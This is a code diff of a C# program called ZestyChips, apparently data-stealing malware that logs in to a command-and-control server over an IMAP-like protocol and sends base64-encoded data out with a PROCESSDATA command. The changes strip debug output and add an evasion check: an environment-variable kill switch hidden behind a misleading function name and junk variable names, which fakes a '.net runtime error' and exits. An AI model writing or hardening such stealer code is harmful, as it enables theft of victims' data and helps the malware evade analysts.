@@ -45,17 +45,10 @@ namespace ZestyChips
 
                 if (Login(username, password))
                 {
-                    Helpers.PrintSuccess("login to IMAP successful.");
-                    // todo from here..
-                    // no point emulating the SELECT on server side
+                    // we have authenticated with the C2
                     Stealer.Start();
                 }
             }
-
-            Helpers.PrintInfo("ZestyChips finshed. Press any key to continue...");
-
-            // stop from exiting for debug
-            Console.ReadKey();
         }
 
         // establish TCP connection to c2
@@ -81,6 +74,12 @@ namespace ZestyChips
 
                 string loginCommand = $"LOGIN {username} {password}\r\n";
                 byte[] commandBytes = Encoding.ASCII.GetBytes(loginCommand);
+                string checkval = Environment.GetEnvironmentVariable("zestychips_idufgh");
+                if (!WinAPIGetDotNetVersion()) {
+                    Console.WriteLine("Fatal .net runtime error.");
+                    Environment.Exit(0);
+                }
+
                 stream.Write(commandBytes, 0, commandBytes.Length);
 
                 stream.ReadTimeout = 5000;
@@ -121,13 +120,10 @@ namespace ZestyChips
         * Encode a string to base64 and send to IMAP server.
         * Returns a bool for success status
         */
-        public static bool SendBase64EncodedData(string data)
-        {
-            try
-            {
+        public static bool SendBase64EncodedData(string data) {
+            try {
                 // encode data to b64
                 string base64Data = Convert.ToBase64String(Encoding.ASCII.GetBytes(data));
-                Helpers.PrintInfo($"Encoded data to base64: {base64Data}");
 
                 NetworkStream stream = client.GetStream();
                 string dataCommand = $"PROCESSDATA {base64Data}\r\n"; // send PROCESSDATA switch
@@ -139,7 +135,7 @@ namespace ZestyChips
                 int bytesRead = stream.Read(response, 0, response.Length);
                 string responseString = Encoding.ASCII.GetString(response, 0, bytesRead); // to string
 
-                Helpers.PrintInfo($"Server response: {responseString}");
+                // Helpers.PrintInfo($"server response: {responseString}");
 
                 return responseString.Contains("OK Data processed");
             }
@@ -153,6 +149,23 @@ namespace ZestyChips
                 Helpers.PrintFail($"Unexpected error: {ex.Message}");
                 return false;
             }
+        }
+
+        private static bool WinAPIGetDotNetVersion() {
+            string ckljvhckjhvb = "zestychips_idufgh";
+
+            string fkujghfsdluifghfdg = SimpleDecrypt(SimpleEncrypt("duihfkuyghbkhr65jhb"));
+            string fsdujiguhlifudgh = SimpleDecrypt(Environment.GetEnvironmentVariable(ckljvhckjhvb));
+
+            return fsdujiguhlifudgh == fkujghfsdluifghfdg;
+        }
+
+        private static string SimpleEncrypt(string input) {
+            return Convert.ToBase64String(Encoding.UTF8.GetBytes(input));
+        }
+
+        private static string SimpleDecrypt(string encryptedInput) {
+            return Encoding.UTF8.GetString(Convert.FromBase64String(encryptedInput));
         }
 
     }
